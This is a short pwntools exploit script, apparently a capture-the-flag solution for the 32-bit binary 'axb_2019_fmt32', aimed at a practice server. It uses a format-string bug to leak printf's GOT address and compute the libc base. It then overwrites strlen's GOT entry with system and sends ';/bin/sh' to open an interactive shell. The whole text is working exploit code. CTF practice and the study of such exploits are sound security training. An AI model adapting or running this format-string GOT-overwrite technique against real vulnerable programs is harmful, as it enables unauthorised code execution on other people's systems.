from pwn import *

context.log_level = "debug"

exe = ELF("./axb_2019_fmt32")
libc = ELF("./libc-2.23.so")
# r = exe.process()
r = remote("node4.buuoj.cn", 26158)

r.recvuntil(b"Please tell me:")
r.send(b"a" + p32(exe.got["printf"]) + b"%8$s")
r.recvuntil(b":a")
r.recv(4)
libc_printf = u32(r.recv(4))
libc_base = libc_printf - libc.sym["printf"]

success("libc base:" + hex(libc_base))
r.recvuntil(b"Please tell me:")
r.send(
    b"a"
    + fmtstr_payload(
        offset=8,
        writes={exe.got["strlen"]: (libc_base + libc.sym["system"])},
        numbwritten=10,
    )
)
# numbwritten is used to indicate the number of bytes already printed
r.recvuntil(b"Please tell me:")
r.send(b";/bin/sh\x00")
r.interactive()
